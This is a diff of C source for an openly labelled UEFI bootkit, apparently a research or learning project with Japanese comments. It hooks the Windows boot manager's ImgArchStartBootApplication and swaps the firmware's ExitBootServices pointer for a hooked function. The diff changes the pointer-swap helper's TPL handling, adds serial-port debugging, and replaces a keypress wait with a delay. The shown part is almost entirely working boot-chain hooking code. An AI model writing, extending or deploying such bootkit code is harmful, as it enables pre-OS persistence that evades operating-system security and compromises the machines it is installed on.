@@ -1,18 +1,17 @@
 ﻿#include "Print.h"
 #include "Bootmgfw.h"
 #include "ImgArchStartBootApplication.h"
+#include "Serial.h"
 
 #include <efi.h>
 #include <efilib.h>
 
 EFI_EXIT_BOOT_SERVICES OriginalExitBootServices = NULL;
 
-BOOLEAN ExecutedExitBootServices = FALSE;
-
-VOID* SetServicePointer(IN OUT VOID** ServiceTableFunction, IN VOID* NewFunction)
+VOID* SetServicePointer(IN OUT VOID** ServiceTableFunction, IN VOID* NewFunction, BOOLEAN IsTpl)
 {
     VOID* OriginalFunction = NULL;
-    EFI_TPL OldTpl = TPL_HIGH_LEVEL;
+    EFI_TPL Tpl = TPL_HIGH_LEVEL;
 
     if (ServiceTableFunction == NULL || NewFunction == NULL)
     {
@@ -24,17 +23,17 @@ VOID* SetServicePointer(IN OUT VOID** ServiceTableFunction, IN VOID* NewFunction
         return OriginalFunction;
     }
 
-    if (!ExecutedExitBootServices)
+    if (IsTpl)
     {
-        OldTpl = gBS->RaiseTPL(OldTpl);
+        Tpl = gBS->RaiseTPL(Tpl);
     }
 
     OriginalFunction = *ServiceTableFunction;
     *ServiceTableFunction = NewFunction;
 
-    if (!ExecutedExitBootServices)
+    if (IsTpl)
     {
-        gBS->RestoreTPL(OldTpl);
+        gBS->RestoreTPL(Tpl);
     }
 
     return OriginalFunction;
@@ -43,18 +42,11 @@ VOID* SetServicePointer(IN OUT VOID** ServiceTableFunction, IN VOID* NewFunction
 // winload.efiから呼び出され、ブートサービスを終了させる
 EFI_STATUS HookedExitBootServices(EFI_HANDLE ImageHandle, UINTN MapKey)
 {
-    UINTN Event;
-
     Print(L"===== HookedExitBootServices =====\r\n");
 
-    SetServicePointer((VOID**)&gBS->ExitBootServices, OriginalExitBootServices);
+    SetServicePointer((VOID**)&gBS->ExitBootServices, OriginalExitBootServices, FALSE);
 
-    // ExitBootServicesが実行された後はブートサービスを利用することができない
-    ExecutedExitBootServices = TRUE;
-
-    Print(L"\n%EPress any key to start.%N\n");
-    gST->ConIn->Reset(gST->ConIn, FALSE);
-    gBS->WaitForEvent(1, &gST->ConIn->WaitForKey, &Event);
+    gBS->Stall(2 * 1000000);
 
     return gBS->ExitBootServices(ImageHandle, MapKey);
 }
@@ -72,6 +64,8 @@ EFI_STATUS efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE* SystemTable)
 #endif
     do
     {
+        SerialPortInitialize(SERIAL_PORT_NUM, SERIAL_BAUDRATE);
+
         gST->ConOut->ClearScreen(gST->ConOut);
 
         Print(L"\r\n%H*** UEFI bootkit ***%N\r\n\r\n");
@@ -116,7 +110,7 @@ EFI_STATUS efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE* SystemTable)
         }
         Print(L"[+] Hooked the bootmgfw.efi!ImgArchStartBootApplication\r\n");
 
-        OriginalExitBootServices = SetServicePointer((VOID*)&gBS->ExitBootServices, &HookedExitBootServices);
+        OriginalExitBootServices = SetServicePointer((VOID*)&gBS->ExitBootServices, &HookedExitBootServices, TRUE);
         Print(L"[+] Original ExitBootServices is 0x%llx\n", OriginalExitBootServices);
 
         // bootmgfw.efiを実行する
